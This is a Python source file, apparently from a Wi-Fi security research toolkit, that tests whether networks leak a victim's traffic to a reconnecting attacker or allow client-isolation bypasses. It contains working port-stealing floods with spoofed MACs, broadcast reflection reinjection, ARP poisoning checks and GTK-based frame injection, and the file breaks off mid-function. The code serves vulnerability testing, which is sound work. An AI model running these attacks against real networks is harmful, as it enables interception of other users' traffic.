#!/usr/bin/env python3
# Copyright (c) 2022, Mathy Vanhoef <mathy.vanhoef@kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

from libwifi import *
import abc, sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, threading
from datetime import datetime
from wpaspy import Ctrl
from libwifi.crypto import encrypt_ccmp

#### Debug output functions ####

# Avoid showing identity warning twice when using --c2c test
already_warned_identity = False
already_warned_key_mgmt = set()

class Daemon(metaclass=abc.ABCMeta):
	def __init__(self, options):
		self.options = options
		self.nic_iface = None
		self.process = None

		self.wpaspy_pending = []


	@abc.abstractmethod
	def start(self):
		pass


	def wpaspy_command(self, cmd, can_fail=False):
		# Include console prefix so we can ignore other messages sent over the control interface
		response = self.wpaspy_ctrl.request("> " + cmd)
		while not response.startswith("> "):
			self.wpaspy_pending.append(response)
			response = self.wpaspy_ctrl.recv()

		if "UNKNOWN COMMAND" in response:
			log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant/hostapd?" % cmd.split()[0])
			quit(1)
		elif "FAIL" in response:
			if not can_fail:
				log(ERROR, f"Failed to execute command {cmd}")
				quit(1)
			else:
				return None

		return response[2:]


	def wait_event(self, event, timeout=60*60*24*365):
		while len(self.wpaspy_pending) > 0:
			line = self.wpaspy_pending.pop()
			if event in line:
				return True

		time_end = time.time() + timeout
		time_curr = time.time()
		while time_curr < time_end:
			remaining_time = time_end - time_curr
			sel = select.select([self.wpaspy_ctrl.s], [], [], remaining_time)
			if self.wpaspy_ctrl.s in sel[0]:
				line = self.wpaspy_ctrl.recv()
				if event in line:
					return True
			time_curr = time.time()

		return False


	def connect_wpaspy(self):
		# Wait until daemon started
		time_abort = time.time() + 10
		while not os.path.exists("wpaspy_ctrl/" + self.nic_iface) and time.time() < time_abort:
			time.sleep(0.1)

		# Abort if daemon didn't start properly
		if not os.path.exists("wpaspy_ctrl/" + self.nic_iface):
			log(ERROR, "Unable to connect to control interface. Did hostap/wpa_supplicant start properly?")
			log(ERROR, "Try recompiling them using ./build.sh and double-check client.conf and hostapd.conf.")
			quit(1)

		# Open the wpa_supplicant or hostapd control interface
		try:
			self.wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.wpaspy_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly.")
			log(ERROR, "Please restart it manually and inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise


	def stop(self):
		log(STATUS, "Closing daemon and cleaning up ...")
		if self.process:
			self.process.terminate()
			self.process.wait()


class Monitor(Daemon):
	def __init__(self, iface, options):
		super().__init__(options)
		self.nic_iface = iface
		self.sock_mon  = None
		self.netid_attacker = None
		self.netid_victim = None
		self.bssid_attacker = None
		self.bssid_victim=None

		self.mac = get_macaddress(self.nic_iface)
		self.clientip = None
		self.routermac = None
		self.routerip = None
		self.arp_sock = None
		self.can_send_traffic = False

		self.dhcp_xid = None
		self.dhcp_offer_frame = False
		self.time_retrans_dhcp = None
		self.dhcp_retrans_attempts = None
		self.time_retrans_arp = None
		self.arp_retrans_attempts = None

		self.tcp_src_port = None
		self.tcp_src_seq = None
		self.has_reconnected = False
		self.time_syn = None
		self.time_last_synack = None

		self.eth_handler = None

	def start(self):
		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		
		cmd1 = ["ifconfig", self.nic_iface, "down"]
		cmd2 = ["iwconfig", self.nic_iface, "mode", "monitor"]
		cmd3 = ["ifconfig", self.nic_iface, "up"]
		
		log(STATUS, f"Starting monitor mode using ifconfig/iwconfig on {self.nic_iface}")
		
		subprocess.Popen(cmd1)
		subprocess.Popen(cmd2)
		subprocess.Popen(cmd3)

		if self.options.c2m_mon_channel:
			cmd4 = ["iw", "dev", self.nic_iface, "set", "channel", str(self.options.c2m_mon_channel)]
			log(STATUS, f"Switching {self.nic_iface} to channel {self.options.c2m_mon_channel}")
			subprocess.Popen(cmd4)

		time.sleep(2)
		
		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_iface, dumpfile=self.options.c2m_mon_output)

	def stop(self):
		if self.sock_mon: self.sock_mon.close()
		
		cmd1 = ["ifconfig", self.nic_iface, "down"]
		cmd2 = ["iwconfig", self.nic_iface, "mode", "managed"]
		cmd3 = ["ifconfig", self.nic_iface, "up"]
		
		log(STATUS, f"Stopping monitor mode on {self.nic_iface}")
		
		subprocess.Popen(cmd1)
		subprocess.Popen(cmd2)
		subprocess.Popen(cmd3)

		super().stop()

	def event_loop(self, condition=lambda: False, timeout=2**32):
		curr_time = time.time()
		end_time = curr_time + timeout
		while not condition() and curr_time < end_time:
			sockets = [self.sock_mon]

			remaining_time = min(end_time - curr_time, 0.5)
			sel = select.select(sockets, [], [], remaining_time)
			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if p != None: self.handle_mon(p)

			#self.time_tick()
			curr_time = time.time()
	def is_target_frame(self, p):
		if not p.haslayer(Dot11) or not p.haslayer(Dot11CCMP):
			return False  # Ensure it's an 802.11 frame with CCMP encryption
		
		mac_header_len = 24 if (not p.subtype & 0x08) else 26  # 24 bytes normally, 26 if QoS
		ccmp_len = 8  # CCMP header size
		#mic_len = 8   # MIC field
		enc_data_len = 110  # The required data field size

		# Compute the actual data length
		actual_data_len = len(p) - (mac_header_len + ccmp_len)

		return actual_data_len == 110 or actual_data_len == 132 or actual_data_len == 145
		
	def handle_mon(self, p):
		if p and self.is_target_frame(p):  # Check packet size
			log(STATUS, f"Captured large frame: {len(p)} bytes", color="green")
			p.show()

	def inject_mon(self, p):
		if p is None or not p.haslayer(Dot11):
			log(WARNING, "Injecting frame on monitor iface without Dot11-layer.")
		self.sock_mon.send(p)



class Supplicant(Daemon):
	def __init__(self, iface, options):
		super().__init__(options)
		self.nic_iface = iface
		self.sock_eth  = None
		self.netid_attacker = None
		self.netid_victim = None
		self.bssid_attacker = None
		self.bssid_victim=None

		self.mac = get_macaddress(self.nic_iface)
		self.clientip = None
		self.routermac = None
		self.routerip = None
		self.arp_sock = None
		self.can_send_traffic = False

		self.dhcp_xid = None
		self.dhcp_offer_frame = False
		self.time_retrans_dhcp = None
		self.dhcp_retrans_attempts = None
		self.time_retrans_arp = None
		self.arp_retrans_attempts = None

		self.tcp_src_port = None
		self.tcp_src_seq = None
		self.has_reconnected = False
		self.time_syn = None
		self.time_last_synack = None

		self.eth_handler = None


	def get_identity_representation(self, net_id, id_str):
		key_mgmt = self.wpaspy_command(f"GET_NETWORK {net_id} key_mgmt", can_fail=True)

		if "PSK" in key_mgmt:
			return "PSK{" + self.wpaspy_command(f"GET_NETWORK {net_id} psk", can_fail=True).strip('"') + "}"

		elif key_mgmt in ["SAE", "FT-SAE"]:
			psk = self.wpaspy_command(f"GET_NETWORK {net_id} sae_password", can_fail=True).strip('"')
			if psk == None:
				psk = self.wpaspy_command(f"GET_NETWORK {net_id} psk", can_fail=True).strip('"')
			if is_valid_sae_pk_password(psk):
				return "SAEPK{" + psk + "}"
			return key_mgmt + "{" + psk + "}"

		elif "EAP" in key_mgmt or key_mgmt in ["IEEE8021X"]:
			return "EAP{" + self.wpaspy_command(f"GET_NETWORK {net_id} identity", can_fail=True).strip('"') + "}"

		else:
			if not key_mgmt in ["NONE"] and key_mgmt not in already_warned_key_mgmt:
				log(WARNING, f"WARNING: Authentication mechanism {key_mgmt} wasn't tested with this script!")
				already_warned_key_mgmt.add(key_mgmt)
			return f"{key_mgmt}-{id_str}"

		return None


	def find_netids(self, only_victim=False):
		global already_warned_identity

		netid = 0
		while True:
			id_str = self.wpaspy_command(f"GET_NETWORK {netid} id_str", can_fail=True)
			if id_str is None: break

			if str(id_str).strip('"') == "attacker":
				if self.netid_attacker is not None:
					log(ERROR, f"ERROR: Found multiple network blocks with id_str equal to 'attacker'")
					quit(1)
				self.netid_attacker = netid
			elif str(id_str).strip('"') == "victim":
				if self.netid_victim is not None:
					log(ERROR, f"ERROR: Found multiple network blocks with id_str equal to 'victim'")
					quit(1)
				self.netid_victim = netid
			netid += 1

		if self.options.flip_id:
			log(STATUS, "Switching the victim and attacker identities.")
			self.netid_victim, self.netid_attacker = self.netid_attacker, self.netid_victim

		if self.netid_victim is None:
			log(ERROR, f"Unable to find network configuration with id_str equal to 'victim'")
			quit(1)

		# When we are only interested in reconnecting as the victim, skip the other checks
		self.id_victim = self.get_identity_representation(self.netid_victim, "victim")
		if only_victim:
			return

		if self.netid_attacker is None:
			log(ERROR, f"Unable to find network configuration with id_str equal to 'attacker'")
			quit(1)

		# Sanity check: victim and attacker should connect to the same SSID.
		ssid_attacker = str(self.wpaspy_command(f"GET_NETWORK {self.netid_attacker} ssid")).strip('"')
		ssid_victim = str(self.wpaspy_command(f"GET_NETWORK {self.netid_victim} ssid")).strip('"')
		if not self.options.no_ssid_check and ssid_attacker != ssid_victim:
			log(ERROR, f"ERROR: Attacker and victim network use a different SSID.")
			log(ERROR, f"       Victim uses {ssid_victim} and attacker {ssid_attacker}.")
			log(ERROR, f"       Disable this check by specifying --no-ssid-check.")
			quit(1)

		# Sanity check: victim and attacker should be using a different identity, unless SAE-PK is used
		self.id_attacker = self.get_identity_representation(self.netid_attacker, "attacker")
		if not (self.options.c2c and already_warned_identity) and self.id_victim == self.id_attacker:
			already_warned_identity = True
			if self.id_victim.startswith("PSK{"):
				log(STATUS, f"Note: Victim and attacker are using the same password {self.id_victim}. In this scenario")
				log(STATUS, f"      the attack may be less damaging, see the Threat Model Discussion in README.md.")
			elif self.id_victim.startswith("SAEPK{"):
				pass
			else:
				lvl = WARNING if self.options.no_id_check else ERROR
				log(lvl, f"ERROR: Victim and attacker are using the same identity {self.id_victim}.")
				log(lvl, f"       You must use different identities for this script to give meaningful results!")
				if not self.options.no_id_check:
					log(lvl, f"       Use the --no-id-check parameter to continue anyway.")
					quit(1)

		# Sanity check: can't specify the same BSSID for the attacker/victim and then specify --other-bss
		self.bssid_victim = self.wpaspy_command(f"GET_NETWORK {self.netid_victim} bssid", can_fail=True)
		self.bssid_attacker = self.wpaspy_command(f"GET_NETWORK {self.netid_attacker} bssid", can_fail=True)
		if self.options.other_bss and self.bssid_attacker != None and self.bssid_victim == self.bssid_attacker:
			log(ERROR, f"Config file has the same BSSID {self.bssid_attacker} for both the victim and attacker, but you")
			log(ERROR, f"specified --other-bss to make the victim/attacker use a different AP. This is impossible.")
			log(ERROR, f"Either remove one of the BSSID entries in the config or don't use the --other-bss parameter.")
			quit(1)


	def start(self):
		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# Remove old occurrences of the control interface that didn't get cleaned properly
		subprocess.call(["rm", "-rf", "wpaspy_ctrl/"])

		cmd = ["../wpa_supplicant/wpa_supplicant", "-Dnl80211", "-i", self.nic_iface,
			"-c", self.options.config, "-W"]
		if self.options.debug == 1:
			cmd += ["-d", "-K"]
		elif self.options.debug >= 2:
			cmd += ["-dd", "-K"]

		log(STATUS, "Starting wpa_supplicant using: " + " ".join(cmd))
		try:
			self.process = subprocess.Popen(cmd)
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant using ./build.sh?")
			raise

		self.connect_wpaspy()
		self.wpaspy_command("DISABLE_NETWORK all")

		# Find network configuration of the victim and attacker.
		# Only victim config is needed when same-id parameter was given.
		self.find_netids(only_victim=self.options.same_id or self.options.ping)

		# Don't let scan results expire so we can always rapidly reconnect
		self.wpaspy_command(f"SET scan_res_valid_for_connect 3600")

		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)


	def scan(self, wait=True):
		self.wpaspy_command(f"SCAN", can_fail=True)		
		if wait: self.wait_scan_done()


	def wait_scan_done(self):
		self.wait_event("CTRL-EVENT-SCAN-RESULTS")

	def connect(self, netid, timeout=30):
		# Need to first disconnect in case we are reconnecting to the same network (otherwise
		# wpa_supplicant will just ignore the SELECT_NETWORK command if it's already connected).
		self.wpaspy_command("DISCONNECT")
		self.wpaspy_command(f"SELECT_NETWORK {netid}")
		if not self.wait_event("CTRL-EVENT-CONNECTED", timeout):
			log(ERROR, "Timeout while connecting to network. Exiting.")
			quit(1)


	def disconnect(self, wait=True):
		self.wpaspy_command(f"DISABLE_NETWORK all")
		if wait: self.wait_event("CTRL-EVENT-DISCONNECTED")


	def send_dhcp_discover_or_request(self):
		if not self.dhcp_offer_frame:
			self.send_dhcp_discover()
		else:
			self.send_dhcp_request(self.dhcp_offer_frame)

		self.time_retrans_dhcp = time.time() + 2.5


	def send_arp_request(self):
		request = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.mac)/ARP(pdst=self.routerip, hwsrc=self.mac, psrc=self.clientip)
		log(STATUS, f"Sending ARP request for the router IP {self.routerip}.")
		self.send_eth(request, logtx=True)

		self.time_retrans_arp = time.time() + 2.5


	def event_loop(self, condition=lambda: False, timeout=2**32):
		curr_time = time.time()
		end_time = curr_time + timeout
		while not condition() and curr_time < end_time:
			sockets = [self.sock_eth]

			remaining_time = min(end_time - curr_time, 0.5)
			sel = select.select(sockets, [], [], remaining_time)
			if self.sock_eth in sel[0]:
				p = self.sock_eth.recv()
				if p != None: self.handle_eth(p)

			self.time_tick()
			curr_time = time.time()


	def get_ip_address(self):
		# Continue attack by monitoring both channels and performing needed actions
		self.can_send_traffic = False
		self.dhcp_retrans_attempts = 5
		self.send_dhcp_discover_or_request()
		self.event_loop(lambda: self.can_send_traffic == True)


	def send_dhcp_discover(self):
		if self.dhcp_xid == None:
			self.dhcp_xid = random.randint(0, 2**31)

		rawmac = bytes.fromhex(self.mac.replace(':', ''))
		req = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.mac) \
				/ IP(src="0.0.0.0", dst="255.255.255.255") \
				/ UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=self.dhcp_xid) \
				/ DHCP(options=[("message-type", "discover"), "end"])

		log(STATUS, f"Sending DHCP discover with XID {self.dhcp_xid}")
		self.send_eth(req)


	def send_dhcp_request(self, offer):
		myip = offer[BOOTP].yiaddr
		rawmac = bytes.fromhex(self.mac.replace(':', ''))

		reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.mac) \
					/ IP(src="0.0.0.0", dst="255.255.255.255") \
					/ UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=self.dhcp_xid) \
					/ DHCP(options=[("message-type", "request"), ("requested_addr", myip),
						("server_id", offer[IP].src), ("hostname", "fragclient"), "end"])

		log(STATUS, f"Sending DHCP request with XID {self.dhcp_xid}")
		self.send_eth(reply)


	def initialize_routing(self):
		assert self.mac is not None and \
			self.clientip is not None and \
			self.routermac is not None and \
			self.routerip is not None
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.clientip, ARP_addr=self.mac)
		self.can_send_traffic = True


	def send_eth(self, p, logtx=False):
		# Assume we're sending to the router
		if not Ether in p:
			p = Ether(dst=self.routermac, src=self.mac)/p
		if logtx:
			log(STATUS, f"Transmitted packet: {repr(p)}")
		self.sock_eth.send(p)


	def send_tcp_syn(self):
		self.tcp_src_port = random.randint(1024, 2**15)
		self.tcp_src_seq = random.randint(100, 2**31)

		p = IP(dst=self.options.server, src=self.clientip)
		p = p/TCP(dport=self.options.port, sport=self.tcp_src_port, seq=self.tcp_src_seq)

		log(STATUS, f"Transmitting challenge TCP SYN packet to {self.options.server}:{self.options.port}", color="green")

		for i in range(2):
			self.send_eth(p, logtx=True)
		self.time_syn = time.time()


	def handle_eth_dhcp(self, p):
		"""Handle packets needed to connect and request an IP"""
		if not DHCP in p: return

		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')

		# DHCP Offer
		if req_type == 2:
			log(STATUS, f"Received DHCP offer for {p[BOOTP].yiaddr}, sending DHCP request.")
			self.send_dhcp_request(p)
			self.dhcp_offer_frame = p

		# DHCP Ack
		elif req_type == 5:
			self.time_retrans_dhcp = None
			self.clientip = p[BOOTP].yiaddr
			self.routerip = p[IP].src

			# In case the router has a different IP then the DHCP server, do an ARP request for it
			routers = [opt[1] for opt in p[DHCP].options if opt[0] == "router"]
			if len(routers) > 0 and routers[0] != self.routerip:
				self.routermac = None
				self.routerip = routers[0]
				self.arp_retrans_attempts = 5
				log(STATUS, f"DHCP ACK: Got IP address {self.mac}:{self.clientip} with router at <unknown MAC address>/{self.routerip}.", color="green")
				self.send_arp_request()
			else:
				self.routermac = p[Ether].src
				log(STATUS, f"DHCP ACK: Got IP address {self.clientip}/{self.mac} with router at {self.routerip}/{self.routermac}.", color="green")
				self.initialize_routing()

		# DHCP Nack
		elif req_type == 6:
			log(ERROR, "Received DHCP NAK")


	def handle_tcp(self, p):
		if p[IP].dst == self.clientip and p[IP].src == self.options.server \
			and p[TCP].dport == self.tcp_src_port and p[TCP].sport == self.options.port \
			and p[TCP].ack == self.tcp_src_seq + 1:
			log(STATUS, f"Received TCP response: {repr(p)}")
			if self.options.ping:
				self.time_last_synack = time.time()
				log(STATUS, f"Received SYN/ACK {self.time_last_synack - self.time_syn} seconds after sending SYN.", color="green")
			elif self.has_reconnected:
				if self.options.same_id:
					log(STATUS, f">>> Received TCP SYN/ACK after connecting and reconnecting as {self.id_victim}.", color="green")
				else:
					delay = time.time() - self.time_start_reconnect
					log(STATUS, f">>> Attacker {self.id_attacker} intercepted TCP SYN/ACK reply" \
							f" to victim {self.id_victim} after {delay:.1f}s.", color="red")
					if delay < 10:
						log(STATUS, f">>> This means the network is vulnerable!", color="red")
					else:
						log(STATUS, f">>> This means the network is vulnerable, but the {delay:.1f}s " \
								"delay until interception makes attacks harder.", color="orange")
				quit(1)


	def handle_arp(self, p):
		if self.arp_sock != None:
			self.arp_sock.reply(p)

		if self.routermac is None and self.routerip is not None and p[ARP].psrc == self.routerip:
			self.time_retrans_arp = None
			self.routermac = p[ARP].hwsrc
			log(STATUS, f"ARP: Router has MAC address {self.routermac}.", color="green")
			self.initialize_routing()


	def handle_eth(self, p):
		if BOOTP in p and p[BOOTP].xid == self.dhcp_xid:
			self.handle_eth_dhcp(p)
		elif TCP in p:
			self.handle_tcp(p)
		elif ARP in p:
			self.handle_arp(p)

		if self.eth_handler != None:
			self.eth_handler(p)


	def set_eth_handler(self, eth_handler):
		self.eth_handler = eth_handler


	def time_tick(self):
		if self.time_retrans_dhcp != None and time.time() > self.time_retrans_dhcp:
			if self.dhcp_retrans_attempts == 0:
				log(ERROR, "Unable to get IP address via DHCP. Exiting.")
				quit(1)
			self.dhcp_retrans_attempts -= 1
			log(WARNING, "Retransmitting DHCP message", color="orange")
			self.send_dhcp_discover_or_request()

		if self.time_retrans_arp is not None and time.time() > self.time_retrans_arp:
			if self.arp_retrans_attempts == 0:
				log(ERROR, "Unable to get router's MAC address via ARP. Exiting.")
				quit(1)
			self.arp_retrans_attempts -= 1
			log(WARNING, "Retransmitting ARP request", color="orange")
			self.send_arp_request()


	def status(self):
		status = dict()
		result = self.wpaspy_command("STATUS")
		for prop in result.split("\n"):
			if not "=" in prop:
				continue
			key, value = prop.split("=")
			status[key] = value
		return status


	def stop(self):
		if self.sock_eth: self.sock_eth.close()
		super().stop()


	def set_bssid(self, bssid):
		"""Set the BSSID that both the victim and attacker must use"""
		self.wpaspy_command(f"SET_NETWORK {self.netid_victim} bssid {bssid}")
		self.wpaspy_command(f"SET_NETWORK {self.netid_attacker} bssid {bssid}")


	def ignore_bssid(self, bssid):
		self.wpaspy_command(f"BSSID_IGNORE {bssid} permanent")


	def ignore_bssid_clear(self):
		self.wpaspy_command(f"BSSID_IGNORE clear")


	def changemac(self):
		self.wpaspy_command(f"SET mac_addr 1")

	def get_gtk(self):
		return self.wpaspy_command(f"GET gtk")

	def get_gtk_2(self):
		return self.wpaspy_command(f"GET_GTK")


	def run_ping(self):
		self.event_loop(timeout=5)
		if self.time_last_synack is None:
			log(ERROR, ">>> Didn't yet receive TCP SYN/ACK from the server, something is wrong. Double-check connection to the network/server.")
			return

		self.event_loop(timeout=15)

		max_retrans_time = self.time_last_synack - self.time_syn
		if max_retrans_time < 10:
			self.time_last_synack = time.time()
			log(WARNING, f">>> Ping test done. Consider using a server that retransmits SYN/ACK for a longer time.")
		else:
			log(STATUS, f">>> Ping test done, everything looks good so far. You can continue with other tests.", color="green")


	def run(self):
		self.start()

		#
		# Step 1. Initial connect
		#

		# Blacklist the BSSID of the attacker *if* the --other-bss parameter was used
		if self.options.other_bss and self.bssid_attacker != None:
			self.ignore_bssid(self.bssid_attacker)
		# If only an attacker BSSID was provided, without --other-bss, that also use that for the victim
		elif not self.options.other_bss and self.bssid_attacker != None:
			self.set_bssid(self.bssid_attacker)

		log(STATUS, f"Scanning for network and connecting as victim user...", color="green")
		self.scan()
		self.connect(self.netid_victim, timeout=30)

		# Store the BSSID that was used (in case the config didn't explicitly specify it)
		status = self.status()
		self.bssid_victim = status['bssid']

		self.get_ip_address()
		self.send_tcp_syn()

		if self.options.ping:
			self.run_ping()
			quit(1)
		else:
			# Sleep so there's actual time to transmit the packets. Handle ARP meanwhile.
			self.event_loop(timeout=0.3)


		#
		# Step 2. Reconnect
		#

		self.time_start_reconnect = time.time()

		if self.options.other_bss:
			# If --other-bss was used, then blacklist the victim BSSID we just used.
			# This will automatically handle the case whether the user specific an
			# explicit other BSSID for the attacker, or no BSSID was put in the
			# provided config file for the attacker.
			self.ignore_bssid_clear()
			self.ignore_bssid(self.bssid_victim)
			log(WARNING, f"Blacklisted {self.bssid_victim} so we reconnect with a different AP/BSS")
		elif self.bssid_attacker == None:
			# When not using --other-bss, force reconnecting to the same AP
			self.set_bssid(self.bssid_victim)

		if self.options.delay != 0:
			self.disconnect(wait=True)
			log(STATUS, f"Sleeping for {self.options.delay}s before reconnecting")
			time.sleep(self.options.delay)

		if self.options.same_id:
			log(STATUS, f"Reconnecting as the victim...", color="green")
			self.connect(self.netid_victim, timeout=20)
		else:
			log(STATUS, f"Reconnecting as the attacker...", color="green")
			self.connect(self.netid_attacker, timeout=20)
		self.has_reconnected = True

		log(STATUS, f"Listening for replies to the victim's TCP SYN request...", color="green")
		self.get_ip_address()

		time_reconnect = time.time() - self.time_start_reconnect
		if time_reconnect > self.options.delay + 9:
			log(WARNING, f"Took {time_reconnect:.1f}s to reconnect & confirm IP." + \
				" This is slow, may cause test to fail. Options are:")
			log(WARNING, f"- Assure server still sends SYN/ACKs after this time. If so, this script will still work.")
			log(WARNING, f"- Or make this script reconnect faster: use different dongle, tweak network config, etc.")

		self.event_loop(timeout=10)

		if self.options.same_id:
			log(STATUS, f">>> Didn't receive TCP packets anymore after reconnecting normally as {self.id_victim}.", color="red")
		else:
			log(STATUS, f">>> Didn't receive victim ({self.id_victim}) traffic as attacker ({self.id_attacker}).", color="green")
			log(STATUS, f">>> This means the network appears secure.", color="green")


class Client2Client:
	def __init__(self, options):
		self.options = options
		self.poc = options.poc
		if self.options.c2c_port_steal is not None:
			set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
		if not self.poc:
			self.sup_victim = Supplicant(options.iface, options)
			self.sup_attacker = Supplicant(options.c2c, options)
		else:
			self.sup_victim = None
			self.sup_attacker = Supplicant(options.c2c, options)
		self.forward_ip = False
		self.forward_ethernet = False
		self.bssid_victim = None
		self.bssid_attacker = None
		self.attacker_connected = False

	def stop(self):
		if not self.poc:
			self.sup_victim.stop()
		self.sup_attacker.stop()


	def monitor_eth(self, eth):
		if self.options.same_id:
			identities = f"{self.sup_victim.id_victim} to {self.sup_victim.id_victim}"
		else:
			identities = f"{self.sup_victim.id_attacker} to {self.sup_victim.id_victim}"

		if b"forward_ip" in raw(eth):
			self.forward_ip = True
			log(STATUS, f">>> Client to client traffic at IP layer is allowed ({identities}).", color="red")
		elif b"forward_ethernet" in raw(eth):
			self.forward_ethernet = True
			log(STATUS, f">>> Client to client traffic at Ethernet layer is allowed ({identities}).", color="red")
		elif b"icmp_ping_test" in raw(eth):
			log(STATUS, f">>> GTK wrapping ICMP ping is allowed ({identities}).", color="red")
		elif b"broadcast_reflection" in raw(eth):
			log(STATUS, f">>> Broadcast Reflection is allowed ({identities}).", color="red")
		elif ARP in eth and eth[ARP].op == 2 and \
			eth[ARP].psrc == self.sup_victim.routerip and eth[ARP].pdst == self.sup_victim.clientip and \
			eth[ARP].hwdst == self.sup_victim.mac and eth[ARP].hwsrc == self.sup_attacker.mac:
			self.forward_ethernet = True
			log(STATUS, f">>> Client to client traffic at Ethernet (ARP poisoning) layer is allowed ({identities}).", color="red")

		#if self.forward_ethernet and (not self.options.c2c_ip or self.forward_ip):
		#	quit(1)

	def monitor_eth_port_steal(self, eth):
		if not self.options.poc:
			if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890" :
				log(STATUS, f">>> Downlink port stealing is successful.", color="red")
		else:
			log(STATUS, f">>> Frame detected: {eth.summary()}", color="green")
			self.reinject_frame_via_broadcast_reflection(eth)

	def reinject_frame_via_broadcast_reflection(self, eth):
		if Ether in eth:
			pkt = eth.copy()
			pkt[Ether].dst = "ff:ff:ff:ff:ff:ff"
			self.sup_attacker.send_eth(pkt)
			log(STATUS, f">>> Reinjected the frame via broadcast reflection.", color="green")

	def monitor_eth_port_steal_uplink(self, eth):
		if ICMP in eth and eth[ICMP].type == 8 and eth[Raw].load == b"abcdefghijklmn" :
			log(STATUS, f">>> Uplink port stealing is successful.", color="red")

	def send_c2c_frame(self):
		# Option one: test forwarding at the IP level. send_eth will add Ethernet header.
		if self.options.c2c_ip is not None:
			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b"forward_ip")
			log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p)} (Ethernet destination is the attacker's gateway/router)")
			self.sup_attacker.send_eth(p)
			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.routermac)/ip/Raw(b"forward_ip")
			log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p)} (Ethernet destination is the victim's gateway/router)")
			self.sup_attacker.send_eth(p)

		# Option two: test forwarding at the Ethernet level
		elif self.options.c2c_eth is not None:
			# Note: although this is still IP traffic, it is send directly to the MAC address
			# of the reciever instead of to the MAC address of the gateway/router.
			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac, type=0x0800)/ip/Raw(b"forward_ethernet")
			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
			for _ in range(10):
				self.sup_attacker.send_eth(p)

		# Option three: test port stealing by letting the attacker to send a lot of layer-2 frames with src addr as the victim. 
		elif self.options.c2c_port_steal is not None:
			# Before calling this function, self.sup_attacker.mac is already modified to victim's MAC addr. 
			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
			log(STATUS, f"Sending port stealing frames from attacker to attacker's addr:       {repr(p)} (Ethernet destination is the attacker's addr)")
			for _ in range(1000000):
				if self.attacker_connected:
					self.sup_attacker.send_eth(p)
					#log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
				time.sleep(0.001)
			log(STATUS, f"Finished sending 1000000 frames.")

		# Option four: test port stealing (uplink) by letting the attacker send a lot of layer-2 frames with src addr as the victim's gateway. 
		elif self.options.c2c_port_steal_uplink is not None:
			# Before calling this function, self.sup_attacker.mac is already modified to victim's gateway MAC addr. 
			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
			log(STATUS, f"Sending port stealing frames from attacker (gateway MAC address) to himself:       {repr(p)} (Ethernet destination is the attacker's addr)")
			for _ in range(1000000):
				self.sup_attacker.send_eth(p)
				time.sleep(0.1)
			log(STATUS, f"Finished sending 1000000 uplink stealing frames.")

		elif self.options.c2c_broadcast is not None:
			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
			p = Ether(src=self.sup_attacker.mac, dst="ff:ff:ff:ff:ff:ff", type=0x0800)/ip/Raw(b"broadcast_reflection")
			log(STATUS, f"Sending Ethernet layer packet from attacker to ff:ff:ff:ff:ff:ff: {repr(p)} (Ethernet destination is the ff:ff:ff:ff:ff:ff)")
			for _ in range(10):
				self.sup_attacker.send_eth(p)

		elif self.options.c2c_gtk_inject is not None:
			victim_gtk_2 = self.sup_victim.get_gtk_2()
			attacker_gtk_2 = self.sup_attacker.get_gtk_2()
			log(STATUS, f">>> The victim's GTK is ({victim_gtk_2}).", color="green")
			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk_2}).", color="green")
			self.mon_attacker = Monitor(self.options.c2c_gtk_inject, self.options)
			self.mon_attacker.start()

			gtk, idx, seq = attacker_gtk_2.split()
			gtk = bytes.fromhex(gtk)
			idx = int(idx)
			seq = int(seq, 16)
			
			sn = 10

			header = Dot11(type="Data", subtype=0, SC=(sn << 4) | 0)
			# if qos is True:
			if True:
				header[Dot11].subtype = 8
				header.add_payload(Dot11QoS())
			sn += 1
			header.FCfield |= 'from-DS' # From AP.
			header.addr1 = "ff:ff:ff:ff:ff:ff"
			header.addr2 = self.bssid_victim
			header.addr3 = "ff:ff:ff:ff:ff:ff"
			header.FCfield = "from-DS"

			header.TID = 2
			seq += 50
